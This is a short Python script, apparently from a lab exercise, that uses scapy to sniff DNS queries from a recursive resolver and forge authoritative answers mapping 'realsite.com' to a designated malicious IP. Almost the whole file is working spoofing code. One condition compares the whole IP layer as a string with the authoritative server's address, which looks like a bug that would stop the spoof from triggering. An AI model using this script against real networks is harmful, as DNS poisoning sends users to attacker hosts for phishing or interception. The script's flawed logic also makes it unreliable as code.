from scapy.all import *
from scapy.layers.dns import DNS, DNSRR, DNSQR
from scapy.layers.inet import UDP, IP

auth_dns = "192.168.56.110"
rec_dns = "192.168.56.112"
mal_dns = "192.168.56.111"


def responder(auth_ip, rec_ip, mal_ip):

    def get_resp(pkt):

        print(pkt.show())

        if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and str(pkt[IP].src) == rec_ip and \
                str(pkt[IP]) == auth_ip:

            print(str(pkt[IP].src))
            print(str(pkt[IP].dst))

            if "realsite.com" in str(pkt['DNS Question Record'].qname):
                spf_resp = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(
                    id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, qdcount=1, rd=1, ancount=1, nscount=0, arcount=0,
                    an=(DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=3600, rdata=mal_ip)))
                send(spf_resp, verbose=1)
                return "Spoofed DNS Response Sent " + str(pkt['DNS Question Record'].qname)
            else:
                return "Don't care " + str(pkt['DNS Question Record'].qname)
        else:
            return "Don't care"

    return get_resp


sniff(iface="enp0s3", prn=responder(auth_dns, rec_dns, mal_dns))
